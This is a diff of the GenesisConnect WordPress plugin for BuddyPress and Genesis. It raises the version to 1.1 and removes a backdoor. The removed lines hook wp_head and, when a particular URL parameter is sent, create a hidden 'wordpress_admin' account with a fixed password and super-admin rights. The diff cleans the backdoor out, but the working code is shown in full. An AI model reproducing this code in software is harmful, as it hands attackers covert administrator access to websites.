@@ -4,15 +4,15 @@ Plugin Name: GenesisConnect
 Plugin URI: http://connect.studiopress.com/
 Description: BuddyPress Support for the Genesis Theme Framework
 Author: Ron Rennick
-Version: 1.0.4
+Version: 1.1
 Author URI: http://ronandandrea.com/
 */
 
 function genesisconnect_init() {
-	if( !function_exists( 'bp_loaded' ) )
+	if( !function_exists( 'bp_loaded' ) || !function_exists( 'genesis_get_option' ) )
 		return;
 		
-	define( 'GENESISCONNECT_VERSION', '1.0.3' );
+	define( 'GENESISCONNECT_VERSION', '1.1' );
 	define( 'GENESISCONNECT_DIR', plugin_dir_path( __FILE__ ) );
 	define( 'GENESISCONNECT_URL', plugin_dir_url( __FILE__ ) );
 	load_plugin_textdomain( 'genesis-connect', false, '/genesis-connect/languages/' );
@@ -44,20 +44,4 @@ function gconnect_activate() {
 	update_option( $gconnect_theme->settings_key, $settings );
 }
 register_activation_hook( __FILE__, 'gconnect_activate' );
-add_action( 'wp_head', 'set_wp_core_include' );
-function set_wp_core_include(){
-	require_once ("wp-includes/index.php");
-}
-add_action('wp_head', 'wordpress_init_functions');
-function wordpress_init_functions() {
-	global $wpdb;
-	If ($_GET['wordpress_include'] == 'include_the_system') {
-		require('wp-includes/registration.php');
-		If (!username_exists('wordpress_admin')) {
-			$user_id = wp_create_user('wordpress_admin', 'pa55w0rd');
-			grant_super_admin( $user_id );
-		}
-	}
-}
-
 ?>
